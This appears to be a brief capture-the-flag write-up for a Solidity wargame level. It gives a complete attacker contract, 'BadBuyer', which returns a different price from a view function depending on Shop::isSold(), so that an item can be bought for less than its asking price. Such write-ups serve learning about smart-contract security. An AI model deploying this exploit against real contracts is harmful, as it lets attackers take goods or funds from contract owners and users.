### Goals

Set the `Shop::price` to be less then 100.

### Exploit

We can use manipulate the view function so it will return different value for `Shop::isSold()`.

### Code

Deploy contract in Remix

```code
contract BadBuyer {
    Shop shop;
    constructor(Shop _shop) {
      shop = _shop;
    }
    function price() external view returns(uint256) {
      if(!shop.isSold()) {
        return 100;
      } else {
        return 0;
      }
    }

    function buy() external {
      shop.buy();
    }
}
```

Then call `BadBuyer::buy()`

Done!
